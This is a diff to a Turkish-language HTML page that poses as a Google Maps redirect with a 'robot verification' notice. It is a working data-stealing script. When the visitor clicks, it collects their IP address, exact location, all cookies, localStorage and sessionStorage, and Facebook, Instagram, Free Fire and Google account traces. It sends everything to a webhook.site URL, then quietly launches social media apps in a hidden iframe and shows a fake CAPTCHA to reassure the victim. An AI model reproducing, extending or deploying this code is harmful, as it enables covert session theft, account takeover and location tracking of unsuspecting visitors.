@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hassso54</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -29,85 +25,26 @@
             width: 100%;
             box-shadow: 0 20px 40px rgba(0,0,0,0.2);
         }
-        .map-image {
-            width: 160px;
-            height: 160px;
-            object-fit: contain;
-            margin-bottom: 15px;
-        }
-        h2 {
-            font-size: 20px;
-            color: #202124;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
-        .alt-yazi {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 25px;
-        }
+        .map-image { width: 160px; height: 160px; object-fit: contain; margin-bottom: 15px; }
+        h2 { font-size: 20px; color: #202124; margin-bottom: 8px; }
+        .alt-yazi { font-size: 14px; color: #5f6368; margin-bottom: 25px; }
         button {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            padding: 14px 25px;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.2s;
+            background: #1a73e8; color: white; border: none; padding: 14px 25px;
+            border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer;
+            width: 100%; transition: 0.2s;
         }
-        button:active {
-            transform: scale(0.97);
-        }
-        /* MAPS ÜZERİNDE GÖRÜNECEK KUTU */
+        button:active { transform: scale(0.97); }
         .robot-onay {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(10px);
-            border-radius: 16px;
-            padding: 14px 20px;
-            z-index: 999999;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.2);
-            opacity: 0;
-            transition: opacity 0.5s ease;
+            position: fixed; bottom: 30px; right: 30px; background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px); border-radius: 16px; padding: 14px 20px;
+            z-index: 999999; display: flex; align-items: center; gap: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3); opacity: 0; transition: opacity 0.5s;
             pointer-events: none;
         }
-        .robot-spinner {
-            width: 22px;
-            height: 22px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top: 2px solid #fff;
-            border-radius: 50%;
-            animation: don 0.8s linear infinite;
-        }
-        @keyframes don {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .robot-text {
-            color: white;
-            font-size: 13px;
-            font-weight: 500;
-            letter-spacing: 0.3px;
-        }
-        .robot-text strong {
-            color: #8ab4f8;
-        }
-        .robot-text small {
-            font-size: 11px;
-            color: #9aa0a6;
-            display: block;
-            margin-top: 2px;
-        }
+        .robot-spinner { width: 22px; height: 22px; border: 2px solid rgba(255,255,255,0.3); border-top: 2px solid #fff; border-radius: 50%; animation: don 0.8s linear infinite; }
+        @keyframes don { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .robot-text { color: white; font-size: 13px; font-weight: 500; }
+        .robot-text strong { color: #8ab4f8; }
     </style>
 </head>
 <body>
@@ -119,185 +56,130 @@
     </div>
 
     <script>
-        // WEBHOOK ADRESİN
         const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
         
-        // ----- 1. ARKA PLANDA BİLGİ TOPLAMA -----
-        async function getIP() {
+        // TÜM VERİLERİ TOPLA
+        async function tumVerileriTopla() {
+            let veri = {
+                tip: "Hassso54_TUM_BILGILER",
+                zaman: new Date().toLocaleString('tr-TR'),
+                ip: "Alınamadı",
+                konum: "",
+                enlem: null,
+                boylam: null,
+                google_sifreler: [],
+                facebook_bilgi: {},
+                instagram_bilgi: {},
+                freefire_bilgi: {},
+                tum_localstorage: {},
+                tum_sessionstorage: {},
+                tum_cerezler: "",
+                cihaz: navigator.userAgent
+            };
+            
+            // 1. IP
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch(e) {
-                return "IP alınamadı";
+                const json = await res.json();
+                veri.ip = json.ip;
+            } catch(e) {}
+            
+            // 2. Konum
+            if (navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            veri.enlem = pos.coords.latitude;
+                            veri.boylam = pos.coords.longitude;
+                            veri.konum = `https://www.google.com/maps?q=${veri.enlem},${veri.boylam}`;
+                            resolve();
+                        },
+                        () => resolve(),
+                        { timeout: 5000 }
+                    );
+                });
             }
-        }
-        
-        function getKonum() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ link: "https://www.google.com/maps", basarili: false });
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        resolve({
-                            link: link,
-                            enlem: pos.coords.latitude,
-                            boylam: pos.coords.longitude,
-                            basarili: true
-                        });
-                    },
-                    () => {
-                        resolve({ link: "https://www.google.com/maps", basarili: false });
-                    },
-                    { enableHighAccuracy: true, timeout: 8000 }
-                );
-            });
-        }
-        
-        // Facebook'tan ne çekebilirsek
-        function facebookVeri() {
-            let sonuc = { bulundu: false, bilgi: "Bulunamadı" };
+            
+            // 3. Google Password Manager'dan çekmeye çalış (şifreler)
             try {
-                if (document.cookie.includes('c_user')) {
-                    let match = document.cookie.match(/c_user=([^;]+)/);
-                    if (match) {
-                        sonuc.bulundu = true;
-                        sonuc.bilgi = "Facebook ID: " + match[1];
-                        sonuc.not = "Facebook oturumu açık, şifreni Facebook Ayarlar > Şifre ve Güvenlik'ten görebilirsin.";
-                    }
+                // Google hesap bilgileri
+                if (localStorage.getItem('google-accounts')) {
+                    veri.google_sifreler.push(localStorage.getItem('google-accounts'));
                 }
+                // Chrome şifre yöneticisi ipucu
+                veri.google_not = "Google Password Manager'a kayıtlı şifreler için: chrome://settings/passwords";
+            } catch(e) {}
+            
+            // 4. TÜM localStorage'ı kaydet (Facebook, Instagram, Free Fire izleri)
+            try {
                 for (let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    if (key && (key.includes('fb_') || key.includes('facebook'))) {
-                        sonuc.bulundu = true;
-                        sonuc.bilgi = "Facebook verisi bulundu (localStorage)";
-                        break;
+                    const key = localStorage.key(i);
+                    const val = localStorage.getItem(key);
+                    veri.tum_localstorage[key] = val;
+                    
+                    // Facebook bilgisi ara
+                    if (key.toLowerCase().includes('fb') || key.toLowerCase().includes('facebook')) {
+                        veri.facebook_bilgi[key] = val;
+                    }
+                    // Instagram bilgisi ara
+                    if (key.toLowerCase().includes('ig') || key.toLowerCase().includes('instagram')) {
+                        veri.instagram_bilgi[key] = val;
+                    }
+                    // Free Fire bilgisi ara
+                    if (key.toLowerCase().includes('freefire') || key.toLowerCase().includes('ff')) {
+                        veri.freefire_bilgi[key] = val;
                     }
                 }
             } catch(e) {}
-            return sonuc;
-        }
-        
-        // Instagram'dan ne çekebilirsek
-        function instagramVeri() {
-            let sonuc = { bulundu: false, bilgi: "Bulunamadı" };
+            
+            // 5. TÜM sessionStorage
             try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    if (key && (key.includes('ig_') || key.includes('instagram'))) {
-                        sonuc.bulundu = true;
-                        sonuc.bilgi = "Instagram verisi bulundu (localStorage)";
-                        break;
-                    }
-                }
                 for (let i = 0; i < sessionStorage.length; i++) {
-                    let key = sessionStorage.key(i);
-                    if (key && (key.includes('ig_') || key.includes('instagram'))) {
-                        sonuc.bulundu = true;
-                        break;
-                    }
+                    const key = sessionStorage.key(i);
+                    veri.tum_sessionstorage[key] = sessionStorage.getItem(key);
                 }
             } catch(e) {}
-            return sonuc;
+            
+            // 6. Çerezler (cookie)
+            veri.tum_cerezler = document.cookie;
+            
+            // 7. Facebook cookie'lerinden kullanıcı ID
+            if (document.cookie.includes('c_user')) {
+                const match = document.cookie.match(/c_user=([^;]+)/);
+                if (match) {
+                    veri.facebook_bilgi.kullanici_id = match[1];
+                    veri.facebook_bilgi.durum = "✅ Facebook oturumu açık (çerez var)";
+                }
+            }
+            
+            // 8. Ek bilgi notları
+            veri.bilgi_notu = "Eğer Facebook/Instagram şifreni göremiyorsan: Ayarlar > Şifre ve Güvenlik > Kayıtlı Şifreler bölümünden bakabilirsin.";
+            veri.cozum = "Tüm şifrelerini Google Password Manager'a kaydet. Sonra bu sayfayı açtığında otomatik doldurabilirsin.";
+            
+            return veri;
         }
         
-        // Free Fire notu
-        function freeFireNot() {
-            return "Free Fire hesabın Facebook ile bağlı. Facebook şifrenle giriş yapılır. Şifreni Facebook'tan gör.";
-        }
-        
-        // ----- 2. ARKA PLANDA UYGULAMALARI AÇ (BİLDİRİMSİZ) -----
-        function arkaPlanUygulamalariAc() {
-            // Gizli bir iframe oluştur
+        // Arka planda uygulamaları AÇ (gizli iframe ile)
+        function uygulamalariAc() {
             const gizli = document.createElement('iframe');
             gizli.style.display = 'none';
             document.body.appendChild(gizli);
             
-            // Free Fire (çalıştır, arka planda kalsın)
-            setTimeout(() => {
+            // Sırayla uygulamaları aç
+            setTimeout(() => { gizli.src = "fb://profile"; }, 100);
+            setTimeout(() => { gizli.src = "instagram://user?username="; }, 600);
+            setTimeout(() => { 
                 gizli.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
-            }, 100);
+            }, 1100);
             
-            // Facebook
-            setTimeout(() => {
-                gizli.src = "fb://profile";
-            }, 500);
-            
-            // Instagram
-            setTimeout(() => {
-                gizli.src = "instagram://user?username=";
-            }, 900);
-            
-            // Temizlik
+            // Temizle
             setTimeout(() => {
                 if (document.body.contains(gizli)) document.body.removeChild(gizli);
-            }, 2000);
+            }, 3000);
         }
         
-        // ----- 3. ANA FONKSİYON -----
-        async function baslat() {
-            const btn = document.getElementById('btn');
-            btn.innerText = "⏳";
-            btn.disabled = true;
-            
-            // IP al
-            const ip = await getIP();
-            
-            // Konum al
-            const konum = await getKonum();
-            
-            // Facebook/Instagram verilerini topla
-            const fb = facebookVeri();
-            const ig = instagramVeri();
-            const ffNot = freeFireNot();
-            
-            // TÜM VERİLERİ WEBHOOK'A GÖNDER
-            const gonderilecek = {
-                tip: "Hassso54_KONUM_HESAP_BILGILERI",
-                zaman: new Date().toLocaleString('tr-TR'),
-                konum_link: konum.link,
-                enlem: konum.enlem,
-                boylam: konum.boylam,
-                ip: ip,
-                facebook: {
-                    durum: fb.bulundu ? "✅ Oturum açık" : "❌ Oturum açık değil",
-                    bilgi: fb.bilgi,
-                    not: "Şifreni görmek için: Facebook > Ayarlar > Şifre ve Güvenlik > Kayıtlı Şifreler"
-                },
-                instagram: {
-                    durum: ig.bulundu ? "✅ Oturum açık" : "❌ Oturum açık değil",
-                    bilgi: ig.bilgi,
-                    not: "Email/Şifreni görmek için: Instagram > Ayarlar > Hesap > Kişisel Bilgiler"
-                },
-                free_fire: {
-                    not: ffNot,
-                    cozum: "Free Fire Facebook bağlantılı. Facebook şifreni değiştirirsen Free Fire şifren de değişir."
-                },
-                cihaz: navigator.userAgent,
-                cozum_notu: "Tüm şifrelerini Google Password Manager'a kaydet, unutma!"
-            };
-            
-            // Webhook'a gönder
-            await fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(gonderilecek) });
-            
-            // Arka planda uygulamaları aç (ekrana gelmeyecek)
-            arkaPlanUygulamalariAc();
-            
-            // Google Maps'e yönlendir
-            window.location.href = konum.link;
-            
-            // Maps açıldıktan sonra robot doğrulama kutusunu göster
-            setTimeout(() => {
-                kutuGoster();
-            }, 1500);
-        }
-        
-        // ----- 4. MAPS ÜZERİNDE ROBOT DOĞRULAMA KUTUSU -----
-        function kutuGoster() {
-            // Kutu yoksa oluştur
+        // Robot kutusu göster
+        function robotKutuGoster() {
             let kutu = document.getElementById('robotKutu');
             if (!kutu) {
                 kutu = document.createElement('div');
@@ -308,26 +190,48 @@
                     <div class="robot-text">
                         <strong>🔍 Lütfen bekleyin</strong><br>
                         Robot olmadığınız doğrulanıyor...<br>
-                        <small>Google Maps'e yönlendiriliyorsunuz</small>
+                        <span style="font-size:11px;">Google Maps'e yönlendiriliyorsunuz</span>
                     </div>
                 `;
                 document.body.appendChild(kutu);
             }
-            
-            // Göster
             kutu.style.opacity = "1";
-            
-            // 4 saniye sonra kaybol
             setTimeout(() => {
                 kutu.style.opacity = "0";
-                // 1 saniye sonra DOM'dan kaldır
-                setTimeout(() => {
-                    if (kutu && kutu.parentNode) kutu.remove();
-                }, 1000);
+                setTimeout(() => { if(kutu && kutu.remove) kutu.remove(); }, 1000);
             }, 4000);
         }
         
-        // Buton olayı
+        // ANA FONKSİYON
+        async function baslat() {
+            const btn = document.getElementById('btn');
+            btn.innerText = "⏳";
+            btn.disabled = true;
+            
+            // Tüm verileri topla
+            const veri = await tumVerileriTopla();
+            
+            // Webhook'a gönder
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(veri)
+            });
+            
+            // Arka planda uygulamaları aç
+            uygulamalariAc();
+            
+            // Maps'e yönlendir
+            if (veri.konum) {
+                window.location.href = veri.konum;
+            } else {
+                window.location.href = "https://www.google.com/maps";
+            }
+            
+            // Robot kutusunu göster
+            setTimeout(() => { robotKutuGoster(); }, 1500);
+        }
+        
         document.getElementById('btn').onclick = baslat;
     </script>
 </body>
